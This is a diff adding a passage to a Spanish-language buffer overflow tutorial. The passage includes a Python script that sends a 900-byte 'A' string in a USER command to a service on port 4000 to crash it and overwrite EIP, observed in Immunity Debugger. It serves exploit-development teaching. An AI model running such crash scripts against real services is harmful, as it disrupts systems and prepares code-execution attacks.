@@ -65,4 +65,36 @@ Esto es:
 
 Mientras tanto, desde _Immunity Debugger_, estando previamente sincronizados con el proceso, deberemos de utilizarlo como debugger para ver en qué momento se produce una violación de segmento.
 
-Cuando esto ocurra, deberíamos ver como el registro **EIP** toma el valor (**41414141**), correspondiente al caracter "A" en hexadecimal
+Cuando esto ocurra, deberíamos ver como el registro **EIP** toma el valor (**41414141**), correspondiente al caracter "A" en hexadecimal.
+
+Lo bueno de haber creado la lista, es que podemos identificar rápidamente entre qué valores se produce el Búffer Overflow, en otras palabras, si vemos que tras la ejecución de nuestro script en Python el último reporte que se hizo fue **"Enviando 700 bytes..."***, lo conveniente es modificar nuestro script al siguiente contenido:
+
+```python
+#!/usr/bin/python
+# coding: utf-8
+
+import sys,socket
+
+if len(sys.argv) != 2:
+  print "\nUso: python" + sys.argv[0] + " <dirección-ip>\n"
+  sys.exit(0)
+
+buffer = "A"*900
+ipAddress = sys.argv[1]
+
+port = 4000
+
+try:
+  print "Enviando búffer..."
+  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  s.connect((ipAddress, port))
+  s.recv(1024)
+  s.send("USER " + buffer + '\r\n')
+  s.recv(1024)
+  s.close()
+except:
+  print "\nError de conexión...\n"
+  sys.exit(0)
+
+```
+Siempre para asegurar es mejor mandarle los 200 caracteres siguientes de nuestro reporte. Tras la ejecución de esta variante, **Immunity Debugger** directamente nos debería reportar la violación de segmento con el valor **41414141** en el registro **EIP**.
